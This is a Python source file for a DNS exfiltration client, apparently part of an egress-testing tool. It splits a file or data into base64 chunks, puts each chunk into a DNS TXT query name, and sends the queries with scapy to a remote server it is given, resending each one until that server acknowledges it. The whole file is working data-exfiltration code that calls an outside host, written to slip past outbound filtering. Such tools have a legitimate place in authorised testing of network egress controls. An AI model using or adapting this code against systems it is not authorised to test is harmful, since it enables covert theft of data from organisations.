'''

This is a DNS client that transmits data within DNS TXT requests
Thanks to Raffi for his awesome blog posts on how this can be done
http://blog.cobaltstrike.com/2013/06/20/thatll-never-work-we-dont-allow-port-53-out/

'''

import base64
import socket
import sys
from common import helpers
from scapy.all import *


class Client:

    def __init__(self, cli_object):
        self.protocol = "dns"
        self.remote_server = cli_object.ip
        if cli_object.file is None:
            self.file_transfer = False
            self.length = 35
        else:
            self.length = 10
            if "/" in cli_object.file:
                self.file_transfer = cli_object.file.split("/")[-1]
            else:
                self.file_transfer = cli_object.file

    def transmit(self, data_to_transmit):

        byte_reader = 0
        packet_number = 1

        # Determine if sending via IP or domain name
        if helpers.validate_ip(self.remote_server):
            final_destination = self.remote_server
        else:
            print "[*] Resolving IP of domain..."
            final_destination = socket.gethostbyname(self.remote_server)

        # calcalate total packets
        if ((len(data_to_transmit) % self.length) == 0):
            total_packets = len(data_to_transmit) / self.length
        else:
            total_packets = (len(data_to_transmit) / self.length) + 1

        while (byte_reader < len(data_to_transmit)):
            if not self.file_transfer:
                encoded_data = base64.b64encode(data_to_transmit[byte_reader:byte_reader + self.length])
            else:
                encoded_data = base64.b64encode(self.file_transfer +
                    ".:|:." + str(packet_number) + "/" + str(total_packets) + ".:|:." + data_to_transmit[byte_reader:byte_reader + self.length])

            print "[*] Packet Number/Total Packets:        " + str(packet_number) + "/" + str(total_packets)

            # Craft the packet with scapy
            try:
                while True:

                    response_packet = sr1(IP(dst=final_destination)/UDP()/DNS(
                        id=15, opcode=0,
                        qd=[DNSQR(qname=encoded_data, qtype="TXT")], aa=1, qr=0),
                        verbose=False, timeout=2)

                    if response_packet:
                        if response_packet.haslayer(DNSRR):
                            dnsrr_strings = repr(response_packet[DNSRR])
                            if str(packet_number) + "allgoodhere" in dnsrr_strings:
                                break

            except KeyboardInterrupt:
                print "[*] Shutting down..."
                sys.exit()

            # Increment counters
            byte_reader += self.length
            packet_number += 1

        while True:
            final_packet = sr1(IP(dst=final_destination)/UDP()/DNS(
                id=15, opcode=0,
                qd=[DNSQR(qname="ENDTHISFILETRANSMISSIONEGRESSASSESS", qtype="TXT")], aa=1, qr=0),
                verbose=True, timeout=2)

            if final_packet:
                break

        return
